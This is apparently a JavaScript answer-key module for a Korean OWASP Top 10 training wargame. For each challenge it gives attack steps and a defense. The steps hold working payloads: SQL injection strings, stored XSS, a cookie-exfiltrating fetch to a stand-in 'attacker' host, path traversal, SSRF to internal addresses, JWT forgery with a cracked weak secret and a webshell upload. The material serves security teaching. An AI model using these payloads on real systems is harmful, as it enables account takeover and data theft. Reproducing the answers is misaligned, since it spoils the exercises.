// 챌린지별 풀이 해설(Write-up). 문제를 푼 후(solved) 공개된다.
// { challenge_id: { steps: [공격 과정], defense: '방어법' } }
const writeups = {
  'A01-1': {
    steps: [
      '로그인 후 /dashboard/account/<본인id> 로 자신의 계좌를 확인한다.',
      'URL의 id 값을 1, 2, 3 등으로 변경한다.',
      '서버가 세션 사용자와 요청 id를 비교하지 않아 타인 계좌·거래내역이 그대로 노출된다.'
    ],
    defense: '모든 객체 접근 시 서버에서 소유자(세션 user.id)와 요청 리소스 소유자를 반드시 비교. URL/파라미터의 id를 신뢰하지 않는다.'
  },
  'A01-2': {
    steps: [
      '일반 계정으로 /admin 접근 시 403이 반환된다.',
      'requireAdmin 미들웨어가 req.query.role === "admin" 도 허용하도록 잘못 구현됨.',
      '/admin?role=admin 으로 접근하면 관리자 패널이 열린다.'
    ],
    defense: '권한 판단은 오직 서버 세션의 role로만. 쿼리스트링/바디/헤더의 role 값은 절대 신뢰하지 않는다.'
  },
  'A01-3': {
    steps: [
      '/api/users 는 인증 없이 전체 유저와 api_key를 노출한다.',
      '노출된 아무 api_key로 x-api-key 헤더를 채운다.',
      '/api/balance/1, /api/balance/2 처럼 userId만 바꿔 타인 잔액을 조회한다.'
    ],
    defense: 'API Key로 인증된 주체 == 조회 대상인지 서버에서 검증. 목록 API는 인증·최소권한 적용, api_key 같은 비밀값은 응답에서 제외.'
  },
  'A02-1': {
    steps: [
      '/admin/query 에서 SELECT * FROM users 실행.',
      'password 컬럼이 평문 또는 MD5 해시(5f4dcc… = "password")로 저장됨을 확인.',
      'MD5는 레인보우 테이블로 즉시 역산된다.'
    ],
    defense: 'bcrypt/Argon2 등 느린 해시 + salt 사용. MD5/SHA1은 비밀번호에 금지. 관리자에게도 평문 노출 금지.'
  },
  'A02-2': {
    steps: [
      '마이페이지 비밀번호 변경 폼에 "현재 비밀번호" 필드가 없다.',
      '세션 쿠키만 있으면 새 비밀번호로 즉시 변경 가능.',
      'XSS로 탈취한 세션으로도 계정 탈취가 가능하다.'
    ],
    defense: '민감 작업(비번 변경 등)은 현재 비밀번호 재확인 또는 재인증 요구. 변경 시 세션 무효화 및 알림.'
  },
  'A03-1': {
    steps: [
      '로그인 쿼리가 문자열 연결로 구성됨: WHERE username=\'..\' AND password=\'..\'.',
      "username 에 admin'-- 입력 → 뒤 조건이 주석 처리됨.",
      '비밀번호 검증 없이 admin으로 로그인.'
    ],
    defense: 'Prepared Statement(파라미터라이즈드 쿼리) 사용. 입력값을 쿼리 문자열에 직접 삽입 금지. ORM/바인딩 활용.'
  },
  'A03-2': {
    steps: [
      '공지 댓글이 <%- %>(미이스케이프)로 렌더링됨.',
      '<script>alert(document.cookie)</script> 를 댓글로 저장.',
      '해당 글을 여는 모든 사용자 브라우저에서 실행(Stored XSS).'
    ],
    defense: '출력 시 HTML 이스케이프(EJS <%= %>). CSP 헤더, 쿠키 HttpOnly 설정, 입력 검증/살균(sanitize).'
  },
  'A04-1': {
    steps: [
      '송금 amount에 서버 검증이 없다.',
      'amount=-1000000 처럼 음수를 전송.',
      '내 잔액 -(음수)=증가, 상대 잔액 감소. 잔액 증식 성공.'
    ],
    defense: '금액은 서버에서 양수·상한·잔액 범위 검증. 정수/소수 단위 검증, 트랜잭션 원자성 보장.'
  },
  'A04-2': {
    steps: [
      '마이페이지 프로필 수정 요청을 프록시로 가로챈다.',
      'role=user 파라미터를 role=admin 으로 변조 후 전송(Mass Assignment).',
      '변경 후 /admin 접근 시 관리자 권한 획득.'
    ],
    defense: '수정 허용 필드를 화이트리스트로 제한. role 등 권한 필드는 사용자 입력으로 절대 바인딩하지 않는다.'
  },
  'A05-1': {
    steps: [
      '/admin/download?file= 의 file 값이 경로 검증 없이 join된다.',
      '?file=../../app.js, ?file=../../package.json 등으로 상위 경로 접근.',
      '서버 소스·설정 파일 유출(Path Traversal).'
    ],
    defense: '파일명 화이트리스트/베이스 디렉터리 고정 + path.normalize 후 basePath 시작 여부 검증. 사용자 입력 경로 금지.'
  },
  'A05-2': {
    steps: [
      '/login?redirect=https://evil.example.com 로 접근.',
      '로그인 성공 시 서버가 redirect 값으로 그대로 302 이동.',
      '정상 도메인 링크처럼 보이지만 외부 피싱 사이트로 유도 가능.'
    ],
    defense: 'redirect 대상은 상대경로 또는 허용 도메인 화이트리스트로만. 외부 절대 URL 거부.'
  },
  'A06-1': {
    steps: [
      '/system/components 에서 의존성 버전 확인.',
      'jsonwebtoken 8.x, axios 1.6.x 등 알려진 CVE 존재 버전 식별.',
      'CVE-2022-23529(jwt) 등 공개 취약점 매칭.'
    ],
    defense: '의존성 정기 업데이트, npm audit/SCA 도구 상시 운영. 버전 정보 불필요 노출 최소화.'
  },
  'A07-1': {
    steps: [
      '/api/token 으로 JWT 발급받는다.',
      'jwt.io/hashcat 으로 약한 시크릿("secret") 크래킹.',
      'role: admin 으로 페이로드 수정 후 같은 시크릿으로 재서명 → 권한 상승 토큰 위조.'
    ],
    defense: '강력한 랜덤 시크릿(≥256bit) 사용, 시크릿 안전 보관(KMS). verify 시 algorithms 명시로 alg 혼동 방지.'
  },
  'A07-2': {
    steps: [
      '로그인 실패 횟수 제한/계정 잠금이 없다.',
      'Burp Intruder로 alice 계정에 사전 공격(rockyou 등) 수행.',
      '흔한 비밀번호로 로그인 성공.'
    ],
    defense: '로그인 시도 제한(rate limit)·계정 잠금·지수 백오프, CAPTCHA, MFA, 비정상 로그인 탐지.'
  },
  'A08-1': {
    steps: [
      '/api/token 으로 JWT 획득 후 /api/upload 에 확장자 검증 없이 파일 업로드.',
      '.ejs 웹셸을 업로드(원본 파일명 유지).',
      '서버가 업로드 파일을 EJS로 렌더링 → 서버 명령 실행(RCE).'
    ],
    defense: '업로드 확장자/MIME 화이트리스트, 실행 권한 없는 저장소·랜덤 파일명, 업로드물의 서버측 렌더/실행 금지.'
  },
  'A08-2': {
    steps: [
      '송금 POST에 CSRF 토큰·Referer/Origin 검증이 없다.',
      '외부 사이트에 자동 제출 폼을 심는다(/challenges/csrf-poc 참고).',
      '로그인된 피해자가 그 페이지를 열면 세션 쿠키로 송금이 실행된다.'
    ],
    defense: 'CSRF 토큰(동기화 토큰/Double Submit), SameSite=Lax/Strict 쿠키, 민감 작업 Origin 검증.'
  },
  'A09-1': {
    steps: [
      '/api/withdraw 로 출금을 수행한다.',
      '잔액은 줄지만 transactions/audit_logs 에 기록이 남지 않는다.',
      '사고 발생 시 추적 불가(로깅 실패).'
    ],
    defense: '금융성 액션은 감사 로그 필수(누가·언제·얼마·결과). 로그 무결성 보호, 이상거래 알림 연동.'
  },
  'A10-1': {
    steps: [
      '/admin/price-fetch 의 url 값이 검증 없이 서버에서 요청된다.',
      'http://127.0.0.1:3000/… 또는 내부 메타데이터 주소를 입력.',
      '외부에서 못 가던 내부 서비스에 서버를 경유해 접근(SSRF).'
    ],
    defense: '요청 대상 도메인/IP 화이트리스트, 사설망·메타데이터 IP 차단, DNS 리바인딩 방어, egress 프록시.'
  },
  'SHOP-A01': {
    steps: [
      '주문 완료 후 URL의 주문 id를 확인.',
      '/shop/orders/1 처럼 id만 바꿔 접근.',
      '소유자 검증이 없어 타인 주문·배송정보 열람(IDOR).'
    ],
    defense: '주문 조회 시 order.user_id == 세션 user.id 검증. 리소스 소유권 서버 확인.'
  },
  'SHOP-A03-XSS': {
    steps: [
      '상품 리뷰가 미이스케이프로 출력됨.',
      '<img src=x onerror="fetch(\'//attacker/?c=\'+document.cookie)"> 리뷰 저장.',
      '상품 페이지를 여는 사용자 쿠키 탈취(Stored XSS).'
    ],
    defense: '출력 이스케이프, 입력 살균, CSP, 쿠키 HttpOnly.'
  },
  'SHOP-A03-SQLi': {
    steps: [
      '상품 검색 q가 쿼리에 직접 삽입됨(rawQuery).',
      "' OR '1'='1 로 전체 노출 확인.",
      "UNION SELECT 로 users 테이블(비밀번호 포함) 컬럼 수를 맞춰 추출."
    ],
    defense: '파라미터라이즈드 쿼리, 검색어 이스케이프, 최소권한 DB 계정, 에러 메시지 감춤.'
  },
  'SHOP-A04': {
    steps: [
      '장바구니 담기 폼의 unit_price가 hidden input으로 전송됨.',
      '요청을 가로채 unit_price=1 로 변조.',
      '서버가 클라이언트 가격을 신뢰해 거의 무료 결제.'
    ],
    defense: '가격은 서버 DB의 상품 가격으로만 계산. 클라이언트가 보낸 금액·단가는 절대 신뢰하지 않는다.'
  }
};

module.exports = writeups;
